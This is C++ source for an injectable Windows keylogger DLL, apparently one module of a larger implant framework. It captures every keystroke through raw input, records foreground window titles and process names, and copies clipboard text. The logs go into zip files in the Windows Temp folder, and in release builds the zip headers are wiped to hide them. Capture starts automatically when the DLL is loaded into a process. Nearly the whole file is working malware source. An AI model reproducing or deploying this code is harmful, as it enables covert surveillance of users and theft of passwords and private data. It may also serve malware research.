//
// MIT License
//
// Copyright (c) 2019 Rokas Kupstys
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the "Software"),
// to deal in the Software without restriction, including without limitation
// the rights to use, copy, modify, merge, publish, distribute, sublicense,
// and/or sell copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
// THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
// DEALINGS IN THE SOFTWARE.
//
#include <windows.h>
#include <psapi.h>
#include <stl/string.h>
#include <stl/vector.h>
#include <stl/unordered_map.h>
#include <miniz.h>
#include "vr-config.h"
#include "../shared/debug.h"
#include "../shared/win32.h"
#include "../shared/math.h"
#include "../shared/context.h"

stl::vector<stl::string> log_buffer{};
uint32_t clipboard_hash = 0;
stl::unordered_map<unsigned, const char*> key_aliases{};
stl::vector<uint8_t> raw_input_buffer{};
HWND last_logged_window = 0;
uint32_t last_flush_to_file = GetTickCount();
uint32_t keylogger_dump_ms = 10 * 60 * 1000;
SYSTEMTIME last_log_time{};

void log_window_title()
{
    SYSTEMTIME now{};
    last_log_time = now;
    GetLocalTime(&now);
    wchar_t wtitle[256]{};
    last_logged_window = GetForegroundWindow();
    GetWindowTextW(last_logged_window, wtitle, _countof(wtitle));

    wchar_t exe_buffer[MAX_PATH]{};
    DWORD process_id = 0;
    GetWindowThreadProcessId(last_logged_window, &process_id);
    if (HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, process_id))
    {
        GetModuleFileNameExW(hProc, 0, exe_buffer, _countof(exe_buffer));
        CloseHandle(hProc);
    }

    stl::string exe_name = from_wstring(exe_buffer);
    exe_name = exe_name.substring(exe_name.find_last('\\') + 1);
    log_buffer.push_back(stl::string::format("\r\n\r\n%4d-%02d-%02d %02d:%02d:%02d [%s] [%s]\r\n", now.wYear, now.wMonth,
        now.wDay, now.wHour, now.wMinute, now.wSecond, exe_name.c_str(), from_wstring(wtitle).c_str()));
}

stl::string key_to_str(UINT vKey, UINT nScan)
{
    auto it = key_aliases.find(vKey);
    if (it != key_aliases.end())
        return it->second;

    BYTE buf[256]{};
    wchar_t wbuf[16]{};
    if (GetKeyboardState(buf))
        ToUnicode(vKey, nScan, buf, wbuf, _countof(wbuf), 0);
    stl::string text = from_wstring(wbuf);
    if (text.size() == 1)
    {
        // Filter out some ascii characters. Key presses that need to be handled and fall into this range are
        // handled through key_aliases.
        char c = text.at(0);
        if (c < ' ')
            return {};
    }
    return text;
}

void maybe_flush_buffer()
{
    if (log_buffer.empty())
        return;
#ifdef DEBUG
    keylogger_dump_ms = 10000;
#endif
    if ((GetTickCount() - last_flush_to_file) < keylogger_dump_ms)
        return;
    wchar_t user_name[257];
    DWORD user_name_buf_size = _countof(user_name);
    GetUserNameW(user_name, &user_name_buf_size);

    stl::string log_file = stl::string::format("%04d-%02d-%02d - %s.txt", 
        last_log_time.wYear, last_log_time.wMonth, last_log_time.wDay, from_wstring(user_name).c_str());
    stl::string zip_file = deterministic_uuid(vr_mutant_keylogger);
    zip_file = zip_file.substring(1, zip_file.size() - 2);
    HANDLE hFile = INVALID_HANDLE_VALUE;

    for (int index = 0; ; index++)
    {
        stl::string full_name = stl::string::format("%s\\Temp\\%s.%d", GetFolderPath(CSIDL_WINDOWS).c_str(), zip_file.c_str(), index);
#ifdef DEBUG
        full_name += ".zip";
#endif
        hFile = CreateFileA(full_name.c_str(), FILE_ALL_ACCESS, 0, nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        if (hFile != INVALID_HANDLE_VALUE)
        {
            if (GetFileSize(hFile, nullptr) < 1024 * 1024 * 10)
                // Use this file
                break;

            // Try next file
            CloseHandle(hFile);
            hFile = INVALID_HANDLE_VALUE;
        }
    }
    mz_zip_archive zip_in{};
    mz_zip_archive zip_out{};

    stl::vector<uint8_t> zip_buffer;
    zip_buffer.resize(GetFileSize(hFile, nullptr));
    if (zip_buffer.size() > 0)
    {
        if (!ReadFile(hFile, zip_buffer.data(), zip_buffer.size(), nullptr, nullptr))
        {
            CloseHandle(hFile);
            return;
        }
#ifndef DEBUG
        // Restore destroyed zip header
        memcpy(zip_buffer.data(), "PK", 2);
#endif

        if (!mz_zip_reader_init_mem(&zip_in, zip_buffer.data(), zip_buffer.size(), 0))
        {
            CloseHandle(hFile);
            return;
        }
    }

    if (!mz_zip_writer_init_heap(&zip_out, zip_in.m_archive_size, 1024 * 1024 * 10))
    {
        CloseHandle(hFile);
        mz_zip_reader_end(&zip_out);
        return;
    }

    bool log_dumped = false;
    if (zip_buffer.size() > 0)
    {
        for (int i = 0, total = mz_zip_reader_get_num_files(&zip_in); i < total; i++)
        {
            mz_zip_archive_file_stat stat{};
            if (!mz_zip_reader_file_stat(&zip_in, i, &stat))
                break;

            if (strcmp(stat.m_filename, log_file.c_str()) == 0)
            {
                // Append to existing file.
                stl::string output_buffer;
                int output_buffer_size = 0;
                size_t old_log_size = 0;
                void* old_log_text = nullptr;

                for (const stl::string& log : log_buffer)
                    output_buffer_size += log.size();

                old_log_text = mz_zip_reader_extract_to_heap(&zip_in, i, &old_log_size, 0);
                output_buffer_size += old_log_size;

                output_buffer.resize(output_buffer_size);
                if (old_log_text)
                {
                    memcpy(&output_buffer.at(0), old_log_text, old_log_size);
                    free(old_log_text);
                    old_log_text = nullptr;
                }

                int pos = old_log_size;
                for (const stl::string& log : log_buffer)
                {
                    memcpy(&output_buffer.at(pos), log.c_str(), log.size());
                    pos += log.size();
                }

                mz_zip_writer_add_mem(&zip_out, log_file.c_str(), output_buffer.c_str(), output_buffer.size(), MZ_BEST_COMPRESSION);
                log_dumped = true;
            }
            else
            {
                // Copy over older file
                mz_zip_writer_add_from_zip_reader(&zip_out, &zip_in, i);
            }
        }
    }

    if (!log_dumped)
    {
        stl::string output_buffer;
        int output_buffer_size = 0;
        for (const stl::string& log : log_buffer)
            output_buffer_size += log.size();
        int pos = 0;
        output_buffer.resize(output_buffer_size);
        for (const stl::string& log : log_buffer)
        {
            memcpy(&output_buffer.at(pos), log.c_str(), log.size());
            pos += log.size();
        }
        mz_zip_writer_add_mem(&zip_out, log_file.c_str(), output_buffer.c_str(), output_buffer.size(), MZ_BEST_COMPRESSION);
        log_dumped = true;
    }

    mz_zip_reader_end(&zip_in);

    void* buffer_out = nullptr;
    size_t buffer_out_size = 0;
    if (mz_zip_writer_finalize_heap_archive(&zip_out, &buffer_out, &buffer_out_size))
    {
#ifndef DEBUG
        memset(buffer_out, 0, 2);   // Destroy zip header
#endif
        SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
        SetEndOfFile(hFile);
        WriteFile(hFile, buffer_out, buffer_out_size, nullptr, nullptr);
        last_flush_to_file = GetTickCount();
        log_buffer.clear();
        free(buffer_out);
        LOG_DEBUG("Keylogger dumped file '%s' to zip '%s'.", log_file.c_str(), zip_file.c_str());
    }
    mz_zip_writer_end(&zip_out);
    CloseHandle(hFile);
}

LRESULT CALLBACK keylogger_wnd_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    maybe_flush_buffer();

    switch (msg)
    {
    case WM_CREATE:
    {
        RAWINPUTDEVICE device{};
        device.usUsagePage = 1;
        device.usUsage = 6;
        device.dwFlags = RIDEV_INPUTSINK;
        device.hwndTarget = hwnd;
        if (!RegisterRawInputDevices(&device, 1, sizeof(RAWINPUTDEVICE)))
        {
            LOG_CRITICAL("Failed to register raw input device: %d", GetLastError());
            PostQuitMessage(0);
        }
        break;
    }
    case WM_INPUT:
    {
        UINT rew_buf_size = 0;
        if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &rew_buf_size, sizeof(RAWINPUTHEADER)) != 0)
            break;

        if (rew_buf_size > raw_input_buffer.size())
            raw_input_buffer.resize(rew_buf_size);

        PRAWINPUT raw_buffer = (PRAWINPUT)& raw_input_buffer.front();

        if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, raw_buffer, &rew_buf_size, sizeof(RAWINPUTHEADER)) &&
            raw_buffer->data.keyboard.Message != WM_KEYDOWN)
        {
            if (raw_buffer->header.dwType == RIM_TYPEKEYBOARD)
            {
                stl::string text = key_to_str(raw_buffer->data.keyboard.VKey, (BYTE)LOWORD(lParam));
                if (text.size())
                {
                    HWND foreground_window = GetForegroundWindow();
                    if (last_logged_window != foreground_window)
                        log_window_title();
                    log_buffer.push_back(text);
                    GetLocalTime(&last_log_time);
                }
            }
        }
        break;
    }
    case WM_DRAWCLIPBOARD:
    {
        HANDLE hClip = nullptr;
        void* clip_text = nullptr;

        if (OpenClipboard(NULL))
        {
            if (hClip = GetClipboardData(CF_UNICODETEXT))
            {
                if (clip_text = GlobalLock(hClip))
                {
                    auto clip_len = wcslen((wchar_t*)clip_text);
                    auto clip_hash = fnv32a(clip_text, clip_len);
                    if (clip_hash != clipboard_hash)
                    {
                        clipboard_hash = clip_hash;
                        log_window_title();
                        log_buffer.push_back("<Clipboard>\r\n");
                        log_buffer.push_back(from_wstring((const wchar_t*)clip_text));
                        log_buffer.push_back("\r\n</Clipboard>\r\n\r\n");
                        GetLocalTime(&last_log_time);
                    }
                    GlobalUnlock(hClip);
                }
            }
            CloseClipboard();
        }
        break;
    }
    case WM_ENDSESSION:
    case WM_QUERYENDSESSION:
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int main(HMODULE hModule)
{
    DWORD session_id = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &session_id);
    HANDLE hMutex = mutex_lock(combine_hash(vr_mutant_keylogger, session_id));
    if (hMutex == NULL)
    {
        LOG_ERROR("Process %d already has keylogger injected", GetCurrentProcessId());
        free_module_exit_thread(hModule, 1);
        LOG_CRITICAL("This should never execute!");
        return 1;
    }
    context ctx{};

    key_aliases[VK_RETURN] = "\r\n";
    key_aliases[VK_SPACE] = " ";
    key_aliases[VK_BACK] = "[<-]";
    key_aliases[VK_TAB] = "[TAB]";
    key_aliases[VK_CONTROL] = "[CTRL]";
    key_aliases[VK_DELETE] = "[DEL]";
    key_aliases[VK_CAPITAL] = "[CAPS]";
    key_aliases[VK_PRIOR] = "[PAGE UP]";
    key_aliases[VK_NEXT] = "[PAGE DOWN]";
    key_aliases[VK_END] = "[END]";
    key_aliases[VK_HOME] = "[HOME]";
    key_aliases[VK_LWIN] = "[LWIN]";
    key_aliases[VK_RWIN] = "[RWIN]";
    key_aliases[VK_VOLUME_MUTE] = "[MUTE]";
    key_aliases[VK_VOLUME_DOWN] = "[VOL DOWN]";
    key_aliases[VK_VOLUME_UP] = "[VOL UP]";
    key_aliases[VK_MEDIA_PLAY_PAUSE] = "[PLAY/PAUSE]";
    key_aliases[VK_MEDIA_STOP] = "[STOP]";
    key_aliases[VK_MENU] = "[ALT]";
    key_aliases[VK_ESCAPE] = "[ESC]";
    key_aliases[VK_F1 + 0] = "[F1]";
    key_aliases[VK_F1 + 1] = "[F2]";
    key_aliases[VK_F1 + 2] = "[F3]";
    key_aliases[VK_F1 + 3] = "[F4]";
    key_aliases[VK_F1 + 4] = "[F5]";
    key_aliases[VK_F1 + 5] = "[F6]";
    key_aliases[VK_F1 + 6] = "[F7]";
    key_aliases[VK_F1 + 7] = "[F8]";
    key_aliases[VK_F1 + 8] = "[F9]";
    key_aliases[VK_F1 + 9] = "[F10]";
    key_aliases[VK_F1 + 10] = "[F11]";
    key_aliases[VK_F1 + 11] = "[F12]";
    key_aliases[VK_F1 + 12] = "[F13]";
    key_aliases[VK_F1 + 13] = "[F14]";
    key_aliases[VK_F1 + 14] = "[F15]";
    key_aliases[VK_F1 + 15] = "[F16]";
    key_aliases[VK_F1 + 16] = "[F17]";
    key_aliases[VK_F1 + 17] = "[F18]";
    key_aliases[VK_F1 + 18] = "[F19]";
    key_aliases[VK_F1 + 19] = "[F20]";
    key_aliases[VK_F1 + 20] = "[F21]";
    key_aliases[VK_F1 + 21] = "[F22]";
    key_aliases[VK_F1 + 22] = "[F23]";
    key_aliases[VK_F1 + 23] = "[F24]";

    stl::string class_name = deterministic_uuid(combine_hash(combine_hash(vr_mutant_keylogger, GetCurrentProcessId()), GetTickCount()));
    WNDCLASSEX window_class{};
    window_class.cbSize = sizeof(WNDCLASSEX);
    window_class.lpfnWndProc = &keylogger_wnd_proc;
    window_class.hInstance = GetModuleHandle(nullptr);
    window_class.lpszClassName = class_name.c_str();

    if (!RegisterClassEx(&window_class))
    {
        LOG_CRITICAL("Keylogger failed to register window class: %d", GetLastError());
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
        return 1;
    }

    HWND hwnd = CreateWindowExA(0, class_name.c_str(), nullptr, 0, 0, 0, 0, 0, HWND_MESSAGE, nullptr, window_class.hInstance, nullptr);
    if (!hwnd)
    {
        UnregisterClass(class_name, window_class.hInstance);
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
        LOG_CRITICAL("Keylogger failed to create window: %d", GetLastError());
        return 1;
    }

    SetClipboardViewer(hwnd);

    // Read config
    if (const json_t * prop = json_getProperty(ctx.root, xorstr_("keylogger_dump_ms")))
        keylogger_dump_ms = json_getInteger(prop) * 60 * 1000;

    MSG msg;
    unsigned last_host_check = 0;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        if ((GetTickCount() - last_host_check) > 60000)
        {
            last_host_check = GetTickCount();
            if (!mutex_is_locked(vr_mutant_main))
            {
                //break;
            }
        }
    }

    CloseWindow(hwnd);
    UnregisterClass(class_name, window_class.hInstance);
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
    free_module_exit_thread(hModule, 0);
    LOG_CRITICAL("This should never execute!");
    return 0;
}


DWORD WINAPI keylogger_thread(LPVOID module)
{
    return main((HMODULE)module);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        deterministic_uuid_seed = get_machine_hash();
        DWORD thread_id = 0;
        if (HANDLE hThread = CreateThread(nullptr, 0, &keylogger_thread, hinstDLL, 0, &thread_id))
        {
            DWORD exit_code = 0;
            if (WaitForSingleObject(hThread, 3000) != WAIT_TIMEOUT && GetExitCodeThread(hThread, &exit_code) && exit_code == 1)
                LOG_ERROR("Keylogger terminates");
            else
            {
                LOG_DEBUG("Keylogger is running in process %d thread %d", GetCurrentProcessId(), thread_id);
                return TRUE;
            }
        }
        return FALSE;
    }

    return TRUE;
}
